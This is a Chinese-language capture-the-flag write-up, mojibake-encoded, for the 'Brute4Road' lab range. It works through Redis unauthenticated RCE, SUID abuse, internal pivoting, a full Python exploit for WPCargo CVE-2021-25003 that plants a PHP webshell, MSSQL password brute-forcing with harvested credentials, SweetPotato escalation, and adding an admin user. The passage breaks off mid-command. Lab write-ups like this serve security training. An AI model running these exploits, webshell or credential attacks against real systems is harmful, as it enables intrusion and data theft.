[{"content":"å‚è€ƒæ–‡ç« \nhttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\nhttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\næ–‡ç«  - æµ…è°ˆçº¦æŸå§”æ´¾æ”»å‡» - å…ˆçŸ¥ç¤¾åŒº\nFLAG1 æ‹¿åˆ°é¶æœºå…ˆç”¨fscanæ‰«ä¸€æ‰«\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\râ”‚ ___ _ â”‚\râ”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚\râ”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚\râ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚\râ”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚\râ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\rFscan Version: 2.0.0\r[2025-03-17 14:12:55] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\r[2025-03-17 14:12:55] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\r[2025-03-17 14:12:55] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1\r[2025-03-17 14:12:55] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\r[2025-03-17 14:12:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\r[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:80\r[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:22\r[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:6379\r[2025-03-17 14:12:55] [SUCCESS] ç«¯å£å¼€æ”¾ 39.98.114.207:21\r[2025-03-17 14:12:55] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:22 =\u0026gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r[2025-03-17 14:12:55] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:21 =\u0026gt; [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).]\r[2025-03-17 14:13:00] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:80 =\u0026gt; [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx\r[2025-03-17 14:13:00] [SUCCESS] æœåŠ¡è¯†åˆ« 39.98.114.207:6379 =\u0026gt; [redis] ç‰ˆæœ¬:5.0.12 äº§å“:Redis key-value store\r[2025-03-17 14:13:06] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4\r[2025-03-17 14:13:06] [INFO] å¼€å§‹æ¼æ´æ‰«æ\r[2025-03-17 14:13:06] [INFO] åŠ è½½çš„æ’ä»¶: ftp, redis, ssh, webpoc, webtitle\r[2025-03-17 14:13:06] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.98.114.207 çŠ¶æ€ç :200 é•¿åº¦:4833 æ ‡é¢˜:Welcome to CentOS\r[2025-03-17 14:13:07] [SUCCESS] åŒ¿åç™»å½•æˆåŠŸ!\r[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 å‘ç°æœªæˆæƒè®¿é—® æ–‡ä»¶ä½ç½®:/usr/local/redis/db/dump.rdb\r[2025-03-17 14:13:13] [SUCCESS] Redisæ— å¯†ç è¿æ¥æˆåŠŸ: 39.98.114.207:6379\r[2025-03-17 14:13:18] [SUCCESS] æ‰«æå·²å®Œæˆ: 5/5 å‘ç°redisä¸éœ€è¦å¯†ç \né‚£æˆ‘ä»¬è¿ä¸Šå»\nredisæœªæˆæƒæ‹¿shellçš„å¸¸è§åˆ©ç”¨æ–¹æ³•æœ‰å†™webshellï¼Œå†™cornæˆ–è€…å†™sshkey\nè¿™é‡Œæˆ‘å…ˆå°è¯•äº†å†™corn\nå‘ç°æ²¡æƒé™\né‚£åŒæ ·çš„ä¹Ÿæ²¡åŠæ³•å†™sshkey\nçœ‹åˆ°redisç‰ˆæœ¬ä¸º5.0.12\nå¯ä»¥æ‰“redisä¸»ä»å¤åˆ¶ï¼ˆ4.x~5.0.5ï¼‰\nRedisä¸»ä»å¤åˆ¶getshellæŠ€å·§ - Bypass - åšå®¢å›­\nç”Ÿæˆæ¶æ„soæ–‡ä»¶\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake è‡ªåŠ¨åŒ–æ”»å‡»è„šæœ¬\ngit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so\r//python redis-rce.py -r ç›®æ ‡ip-p ç›®æ ‡ç«¯å£ -L æœ¬åœ°ip -f æ¶æ„.so æ‹¿åˆ°shellä¹‹åå…ˆä¸Šä¸ªçº¿\n/home/redis/flag/flag01 è¯»flagå‘ç°æ²¡æœ‰æƒé™\nå°è¯•suidææƒ\n1[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2\u0026gt;/dev/null 2/usr/sbin/pam_timestamp_check 3/usr/sbin/usernetctl 4/usr/sbin/unix_chkpwd 5/usr/bin/at 6/usr/bin/chfn 7/usr/bin/gpasswd 8/usr/bin/passwd 9/usr/bin/chage 10/usr/bin/base64 11/usr/bin/umount 12/usr/bin/su 13/usr/bin/chsh 14/usr/bin/sudo 15/usr/bin/crontab 16/usr/bin/newgrp 17/usr/bin/mount 18/usr/bin/pkexec 19/usr/libexec/dbus-1/dbus-daemon-launch-helper 20/usr/lib/polkit-1/polkit-agent-helper-1 base64å¯ä»¥ææƒï¼Œä½†æ˜¯åªèƒ½è¯»æ–‡ä»¶\nbase64 \u0026#34;/home/redis/flag/flag01\u0026#34; | base64 --decode [redis@centos-web01 tmp]$ base64 \u0026#34;/home/redis/flag/flag01\u0026#34; | base64 --decode\râ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ\râ–‘â–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–‘â–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ\râ–‘â–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆ â–‘â–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ\râ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\râ–‘â–ˆâ–‘â–‘â–‘â–‘ â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ\râ–‘â–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘ â–‘â–ˆ â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ\râ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆ â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\râ–‘â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘ â–‘â–‘ â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘ flag01: flag{b16a2a4f-87b9-404c-8989-3ac8eac58ae2}\rCongratulations! ! !\rGuess where is the second flag? æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\nFLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nçœ‹ä¸€ä¸‹ip\n1[redis@centos-web01 tmp]$ ip addr show 21: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:1a:f1:ec brd ff:ff:ff:ff:ff:ff 10 inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356573sec preferred_lft 315356573sec 12 inet6 fe80::216:3eff:fe1a:f1ec/64 scope link 13 valid_lft forever preferred_lft forever fscanæ‰«ä¸€ä¸‹\n1[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 -nobr 2â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” 3â”‚ ___ _ â”‚ 4â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚ 5â”‚ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / â”‚ 6â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; â”‚ 7â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚ 8â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ 9 Fscan Version: 2.0.0 10 11[2025-03-17 20:10:58] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1 12[2025-03-17 20:10:58] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ 13[2025-03-17 20:10:58] [INFO] CIDRèŒƒå›´: 172.22.2.0-172.22.2.255 14[2025-03-17 20:10:58] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING) 15[2025-03-17 20:10:58] [INFO] è§£æCIDR 172.22.2.7/24 -\u0026gt; IPèŒƒå›´ 172.22.2.0-172.22.2.255 16[2025-03-17 20:10:58] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256 17[2025-03-17 20:10:58] [INFO] å¼€å§‹ä¸»æœºæ‰«æ 18[2025-03-17 20:10:58] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹... 19[2025-03-17 20:10:58] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ… 20[2025-03-17 20:10:58] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹... 21[2025-03-17 20:10:58] [SUCCESS] ç›®æ ‡ 172.22.2.3 å­˜æ´» (ICMP) 22[2025-03-17 20:10:58] [SUCCESS] ç›®æ ‡ 172.22.2.7 å­˜æ´» (ICMP) 23[2025-03-17 20:10:58] [SUCCESS] ç›®æ ‡ 172.22.2.16 å­˜æ´» (ICMP) 24[2025-03-17 20:10:59] [SUCCESS] ç›®æ ‡ 172.22.2.18 å­˜æ´» (ICMP) 25[2025-03-17 20:10:59] [SUCCESS] ç›®æ ‡ 172.22.2.34 å­˜æ´» (ICMP) 26[2025-03-17 20:11:04] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 5 27[2025-03-17 20:11:05] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233 28[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:80 29[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:22 30[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:22 31[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:21 32[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:445 33[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:389 34[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:139 35[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:139 36[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:135 37[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:139 38[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:139 39[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:135 40[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:135 41[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.34:445 42[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:445 43[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:80 44[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:80 45[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.3:88 46[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.18:445 47[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.16:1433 48[2025-03-17 20:11:05] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.2.7:6379 49[2025-03-17 20:11:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:22 =\u0026gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 50[2025-03-17 20:11:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:22 =\u0026gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.] 51[2025-03-17 20:11:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:21 =\u0026gt; [ftp] ç‰ˆæœ¬:3.0.2 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.2).] 52[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:80 =\u0026gt; [http] ç‰ˆæœ¬:1.20.1 äº§å“:nginx 53[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:445 =\u0026gt; 54[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:389 =\u0026gt; [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name 55[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:139 =\u0026gt; Banner:[.] 56[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:139 =\u0026gt; Banner:[.] 57[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:139 =\u0026gt; Banner:[.] 58[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:445 =\u0026gt; 59[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:445 =\u0026gt; 60[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:80 =\u0026gt; [http] ç‰ˆæœ¬:2.0 äº§å“:Microsoft HTTPAPI httpd ç³»ç»Ÿ:Windows 61[2025-03-17 20:11:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:88 =\u0026gt; 62[2025-03-17 20:11:11] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:1433 =\u0026gt; [ms-sql-s] ç‰ˆæœ¬:13.00.4001; SP1 äº§å“:Microsoft SQL Server 2016 ç³»ç»Ÿ:Windows Banner:[.%.] 63[2025-03-17 20:11:11] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.7:6379 =\u0026gt; [redis] ç‰ˆæœ¬:5.0.12 äº§å“:Redis key-value store 64[2025-03-17 20:11:11] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:80 =\u0026gt; [http] 65[2025-03-17 20:12:05] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:139 =\u0026gt; 66[2025-03-17 20:12:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.18:445 =\u0026gt; 67[2025-03-17 20:12:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.34:135 =\u0026gt; 68[2025-03-17 20:12:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.16:135 =\u0026gt; 69[2025-03-17 20:12:10] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.2.3:135 =\u0026gt; 70[2025-03-17 20:12:10] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 21 71[2025-03-17 20:12:10] [INFO] å¼€å§‹æ¼æ´æ‰«æ 72[2025-03-17 20:12:10] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle 73[2025-03-17 20:12:10] [SUCCESS] NetInfo æ‰«æç»“æœ 74ç›®æ ‡ä¸»æœº: 172.22.2.3 75ä¸»æœºå: DC 76å‘ç°çš„ç½‘ç»œæ¥å£: 77 IPv4åœ°å€: 78 â””â”€ 172.22.2.3 79[2025-03-17 20:12:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.16 çŠ¶æ€ç :404 é•¿åº¦:315 æ ‡é¢˜:Not Found 80[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.34 XIAORANG\\CLIENT01 81[2025-03-17 20:12:10] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.7 çŠ¶æ€ç :200 é•¿åº¦:4833 æ ‡é¢˜:Welcome to CentOS 82[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 83[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.3 DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393 84[2025-03-17 20:12:10] [SUCCESS] NetInfo æ‰«æç»“æœ 85ç›®æ ‡ä¸»æœº: 172.22.2.16 86ä¸»æœºå: MSSQLSERVER 87å‘ç°çš„ç½‘ç»œæ¥å£: 88 IPv4åœ°å€: 89 â””â”€ 172.22.2.16 90[2025-03-17 20:12:10] [SUCCESS] NetInfo æ‰«æç»“æœ 91ç›®æ ‡ä¸»æœº: 172.22.2.34 92ä¸»æœºå: CLIENT01 93å‘ç°çš„ç½‘ç»œæ¥å£: 94 IPv4åœ°å€: 95 â””â”€ 172.22.2.34 96[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 97[2025-03-17 20:12:11] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.2.18 çŠ¶æ€ç :200 é•¿åº¦:57738 æ ‡é¢˜:åˆä¸€ä¸ªWordPressç«™ç‚¹ 98[2025-03-17 20:12:13] [SUCCESS] Redis 172.22.2.7:6379 å‘ç°æœªæˆæƒè®¿é—® æ–‡ä»¶ä½ç½®:/usr/local/redis/db/module.so 99[2025-03-17 20:12:17] [SUCCESS] Redisæ— å¯†ç è¿æ¥æˆåŠŸ: 172.22.2.7:6379 100[2025-03-17 20:12:18] [SUCCESS] æ‰«æå·²å®Œæˆ: 37/37 æ‰«å‡ºæ¥å››å°æœºå­\nNetBios 172.22.2.34 XIAORANG\\CLIENT01\rNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab\rNetBios 172.22.2.3 DC:DC.xiaorang.lab\rNetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 WordPress 172.22.2.18ä¸Šæœ‰ä¸€ä¸ªwordpressæœåŠ¡ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä»è¿™é‡Œå…¥æ‰‹\næ‹¿wpscanæ‰«ä¸€ä¸‹\nproxychains4 wpscan --url 172.22.2.18 --api-token my_token æ‰«å‡ºæ¥ä¸€å †æ´\næœ‰ä¸ªèƒ½å¤Ÿrceçš„ï¼Œæ„Ÿè§‰æ¯”è¾ƒå¥½åˆ©ç”¨\n1 2 | [!] Title: WPCargo \u0026lt; 6.9.0 - Unauthenticated RCE 3 | Fixed in: 6.9.0 4 | References: 5 | - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a 6 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003 æ‰¾ä¸€ä¸‹æ¼æ´çš„poc\nWPCargo \u0026lt; 6.9.0 â€“ Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities\npoc\n1import sys 2import binascii 3import requests 4 5# This is a magic string that when treated as pixels and compressed using the png 6# algorithm, will cause \u0026lt;?=$_GET[1]($_POST[2]);?\u0026gt; to be written to the png file 7payload = \u0026#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50\u0026#39; 8 9def encode_character_code(c: int): 10 return \u0026#39;{:08b}\u0026#39;.format(c).replace(\u0026#39;0\u0026#39;, \u0026#39;x\u0026#39;) 11 12text = \u0026#39;\u0026#39;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:] 13 14destination_url = \u0026#39;http://127.0.0.1:8001/\u0026#39; 15cmd = \u0026#39;ls\u0026#39; 16 17# With 1/11 scale, \u0026#39;1\u0026#39;s will be encoded as single white pixels, \u0026#39;x\u0026#39;s as single black pixels. 18requests.get( 19 f\u0026#34;{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}\u0026amp;sizefactor=.090909090909\u0026amp;size=1\u0026amp;filepath=/var/www/html/webshell.php\u0026#34; 20) 21 22# We have uploaded a webshell - now let\u0026#39;s use it to execute a command. 23print(requests.post( 24 f\u0026#34;{destination_url}webshell.php?1=system\u0026#34;, data={\u0026#34;2\u0026#34;: cmd} 25).content.decode(\u0026#39;ascii\u0026#39;, \u0026#39;ignore\u0026#39;)) æˆåŠŸRCEï¼Œç”¨æˆ·æ˜¯www-data\nä½†æ˜¯é¶æœºä¸å‡ºç½‘ï¼Œæ²¡åŠæ³•ä¸Šçº¿\né‚£å°±ç›´æ¥ç”¨èšå‰‘è¿\nåœ¨wordpressçš„é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç \n1// ** Database settings - You can get this info from your web host ** // 2/** The name of the database for WordPress */ 3define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39; ); 4 5/** Database username */ 6define( \u0026#39;DB_USER\u0026#39;, \u0026#39;wpuser\u0026#39; ); 7 8/** Database password */ 9define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;WpuserEha8Fgj9\u0026#39; ); 10 11/** Database hostname */ 12define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;127.0.0.1\u0026#39; ); 13 14/** Database charset to use in creating database tables. */ 15define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); 16 17/** The database collate type. Don\u0026#39;t change this if in doubt. */ 18define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); wpuser/WpuserEha8Fgj9 è¿™ä¸ªæœºå­ä¸å¯¹å¤–å¼€æ”¾ç«¯å£ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨webshellç®¡ç†å™¨ä¸Šçš„æ•°æ®åº“ç®¡ç†å·¥å…·è¿\næ‹¿åˆ°ç¬¬äºŒä¸ªflag\nflag{c757e423-eb44-459c-9c63-7625009910d8} FLAG3 åœ¨è¡¨S0meth1ng_y0u_m1ght_1ntereStedæœ‰ä¸€å †å¯†ç \nä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œå…ˆå¯¼å‡ºæ¥\næ³¨æ„è¿™é‡Œç”¨èšå‰‘å¯¼å‡ºä¹‹å‰è®°å¾—å°†limitå»æ‰ï¼Œä¸ç„¶å¯†ç ä¸å…¨\n172.22.2.16ä¸Šæœ‰mssqlæœåŠ¡\nNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 ç”¨æˆ‘ä»¬æ‰‹ä¸Šçš„è¿™å †å¯†ç çˆ†ç ´ä¸€ä¸‹\næˆåŠŸæ‹¿åˆ°è´¦å·å¯†ç \nsa/ElGNkOiC æ¥ä¸‹æ¥ç›´æ¥ç”¨mdutè¿\næ‹¿åˆ°nt service\\mssqlserveræƒé™\næ²¡æ‰¾åˆ°flagï¼ŒçŒœæµ‹éœ€è¦ææƒã€‚\nå¯ä»¥ç”¨SweetPotatoææƒ\nC:/Users/Public/sweetpotato.exe -a \u0026#34;whoami\u0026#34; æ‹¿åˆ°ç¬¬ä¸‰ä¸ªflag\n=====================================\r8\u0026#34;\u0026#34;\u0026#34;\u0026#34;8 88 8\u0026#34;\u0026#34;\u0026#34;8 8 8 eeee\re e e eeeee eeee 88 8 8 eeeee eeeee eeeee 8eeee8ee 8 8 8 8 8 8 88 88 8eee8e 8 88 8 8 8 8 88 8 8eee8e 8e 8 8e 8eee 88ee88 88 8 8 8 8eee8 8e 8 88 8 88 8 88 8 88 88 88 88 8 8 8 88 8 88 8 88eeeee8 88 8 88ee8 88 88ee 88 88 8 8eee8 88 8 88ee8 flag03: flag{6fc1b639-d71c-4c8b-9747-e29074e05a7e} FLAG4 æ–°å»ºä¸€ä¸ªç”¨æˆ·ç”¨rdpè¿ä¸Šå»\nnet user xrntkk Abc123456 /add\rnet localgroup administrators 